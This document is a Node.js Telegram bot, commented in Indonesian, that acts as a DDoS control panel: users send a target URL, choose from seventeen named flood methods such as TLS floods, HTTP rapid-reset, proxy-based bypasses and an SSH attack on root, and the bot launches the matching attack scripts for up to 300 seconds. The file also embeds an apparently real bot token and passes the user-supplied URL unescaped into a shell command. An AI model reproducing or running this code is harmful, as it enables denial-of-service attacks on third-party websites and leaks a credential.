pconst { Telegraf, Markup } = require('telegraf');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);

// Konfigurasi Bot
const config = {
  token: '7062528333:AAHj5kg-cH7h_YuN0cnTpzzaicqzaTsvTcE',
  maxDuration: 300,
  methodsPerRow: 3, // Jumlah button per baris
  defaultConcurrent: 10,
  defaultConnections: 200
};

// Attack methods dengan parameter default
const attackMethods = {
  'kill': {
    file: 'StarsXKill.js',
    params: (url, duration) => `${url} ${duration} 100 10`
  },
  'strike': {
    file: 'StarsXStrike.js',
    params: (url, duration) => `GET ${url} ${duration} 10 90 proxy.txt --full`
  },
  'flood': {
    file: 'flood.js',
    params: (url, duration) => `${url} ${duration} 200 2 proxy.txt`
  },
  'tls2': {
    file: 'tls.js',
    params: (url, duration) => `${url} ${duration} 200 2 proxy.txt`
  },
  'bypass': {
    file: 'StarsXBypass.js',
    params: (url, duration) => `${url} ${duration} 100 10 proxy.txt`
  },
  'tls': {
    file: 'StarsXTls.js',
    params: (url, duration) => `${url} ${duration} 100 10`
  },
  'ninja': {
    file: 'StarsXNinja.js',
    params: (url, duration) => `${url} ${duration}`
  },
  'mix': {
    file: 'StarsXMix.js',
    params: (url, duration) => `${url} ${duration} 100 10 proxy.txt`
  },
  'raw': {
    file: 'StarsXRaw.js',
    params: (url, duration) => `${url} ${duration}`
  },
  'rapid-reset': {
    file: 'StarsXRapid-Reset.js',
    params: (url, duration) => `PermenMD ${duration} 10 proxy.txt 80 ${url}`
  },
  'pidoras': {
    file: 'StarsXPidoras.js',
    params: (url, duration) => `${url} ${duration} 80 10 proxy.txt`
  },
  'http-x': {
    file: 'HTTP-X.js',
    params: (url, duration) => `${url} ${duration} 80 10 proxy.txt`
  },
  'ssh': {
    file: 'StarsXSsh.js',
    params: (url, duration) => `${url} 22 root ${duration}`
  },
  'SKYNET-TLS': {
    file: 'SKYNET-TLS.js',
    params: (url, duration) => `${url} ${duration} 200 10 proxy.txt`
  },
  'SEN-TLS': {
    file: 'SEN-TLS.js',
    params: (url, duration) => `${url} ${duration} 200 10 proxy.txt`
  },
  'star-tls': {
    file: 'star-tls.js',
    params: (url, duration) => `${url} ${duration} 200 10 proxy.txt`
  },
  'ELSTARO-TLS': {
    file: 'ELSTARO-TLS.js',
    params: (url, duration) => `${url} ${duration} 200 10 proxy.txt`
  }
};

class AttackBot {
  constructor() {
    this.bot = new Telegraf(config.token);
    this.sessions = new Map();
    this.setupHandlers();
  }

  // Membuat button grid yang lebih efisien
  createMethodButtons() {
    const methods = Object.keys(attackMethods);
    const buttons = [];
    for (let i = 0; i < methods.length; i += config.methodsPerRow) {
      buttons.push(
        methods.slice(i, i + config.methodsPerRow).map(method => 
          Markup.button.callback(method, `method_${method}`)
        )
      );
    }
    return Markup.inlineKeyboard(buttons);
  }

  createDurationButtons() {
    return Markup.inlineKeyboard([
      [
        Markup.button.callback('30s ⚡', 'duration_30'),
        Markup.button.callback('60s 🚀', 'duration_60')
      ],
      [
        Markup.button.callback('120s 💣', 'duration_120'),
        Markup.button.callback('300s 💥', 'duration_300')
      ],
      [Markup.button.callback('Custom ⚙️', 'duration_custom')]
    ]);
  }

  getSession(ctx) {
    const chatId = ctx.chat.id;
    if (!this.sessions.has(chatId)) {
      this.sessions.set(chatId, {});
    }
    return this.sessions.get(chatId);
  }

  async executeAttack(ctx, duration) {
    const session = this.getSession(ctx);
    const { method, url } = session;

    if (!method || !url || !attackMethods[method]) {
      return ctx.reply('❌ Error: Invalid method or URL.');
    }

    try {
      const attack = attackMethods[method];
      const command = `node ${attack.file} ${attack.params(url, duration)}`;
      
      const statusMessage = await ctx.reply(
        `⚡ ATTACK STARTED ⚡\n\n` +
        `🎯 Target: ${url}\n` +
        `💣 Method: ${method}\n` +
        `⏱️ Duration: ${duration}s\n\n` +
        `🔄 Status: Running...`
      );

      const { stdout, stderr } = await execPromise(command);
      
      if (stderr) {
        await ctx.telegram.editMessageText(
          statusMessage.chat.id,
          statusMessage.message_id,
          null,
          `❌ ATTACK FAILED ❌\n\nError: ${stderr}`
        );
        return;
      }

      await ctx.telegram.editMessageText(
        statusMessage.chat.id,
        statusMessage.message_id,
        null,
        `✅ ATTACK COMPLETED ✅\n\n` +
        `🎯 Target: ${url}\n` +
        `💣 Method: ${method}\n` +
        `⏱️ Duration: ${duration}s\n\n` +
        `📊 Result: ${stdout || 'Success'}`
      );

    } catch (error) {
      ctx.reply(`💀 CRITICAL ERROR 💀\n${error.message}`);
    } finally {
      // Cleanup session
      delete session.method;
      delete session.url;
    }
  }

  setupHandlers() {
    // Start command
    this.bot.command('start', (ctx) => {
      ctx.reply(
        `💀 Welcome to DDoS Bot 💀\n\n` +
        `Commands:\n` +
        `/ddos <url> - Start attack\n` +
        `/help - Show help\n\n` +
        `⚠️ Use responsibly!`
      );
    });

    // Help command
    this.bot.command('help', (ctx) => {
      ctx.reply(
        `📖 Help Menu 📖\n\n` +
        `1. Use /ddos <url> to start\n` +
        `2. Choose attack method\n` +
        `3. Select duration\n\n` +
        `Max duration: ${config.maxDuration}s\n` +
        `Available methods: ${Object.keys(attackMethods).length}`
      );
    });

    // DDoS command
    this.bot.command('ddos', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1);
      if (args.length < 1) {
        return ctx.reply('❌ Error: URL required\nUsage: /ddos <url>');
      }

      const url = args[0];
      const session = this.getSession(ctx);
      session.url = url;

      ctx.reply(
        `🎯 Target: ${url}\n\n` +
        `Choose attack method:`,
        this.createMethodButtons()
      );
    });

    // Method selection handler
    this.bot.action(/method_(.+)/, (ctx) => {
      const session = this.getSession(ctx);
      const method = ctx.match[1];
      
      if (!attackMethods[method]) {
        return ctx.reply('❌ Invalid method!');
      }

      session.method = method;
      
      ctx.editMessageText(
        `🎯 Target: ${session.url}\n` +
        `💣 Method: ${method}\n\n` +
        `Select duration:`,
        this.createDurationButtons()
      );
    });

    // Duration selection handler
    this.bot.action(/duration_(\d+)/, async (ctx) => {
      const duration = parseInt(ctx.match[1]);
      if (duration > config.maxDuration) {
        return ctx.reply(`❌ Max duration: ${config.maxDuration}s`);
      }
      await this.executeAttack(ctx, duration);
    });

    // Custom duration handler
    this.bot.action('duration_custom', (ctx) => {
      ctx.reply(`Enter duration (max ${config.maxDuration}s):`);
      
      // One-time message handler for custom duration
      const handler = async (ctx) => {
        const duration = parseInt(ctx.message.text);
        if (isNaN(duration) || duration <= 0 || duration > config.maxDuration) {
          return ctx.reply(`❌ Invalid duration! (1-${config.maxDuration}s)`);
        }
        await this.executeAttack(ctx, duration);
        this.bot.off('text', handler); // Remove handler after use
      };

      this.bot.on('text', handler);
    });
  }

  launch() {
    this.bot.launch();
    console.log('🚀 Bot started');

    // Graceful shutdown
    process.once('SIGINT', () => this.bot.stop('SIGINT'));
    process.once('SIGTERM', () => this.bot.stop('SIGTERM'));
  }
}

// Start bot
new AttackBot().launch();
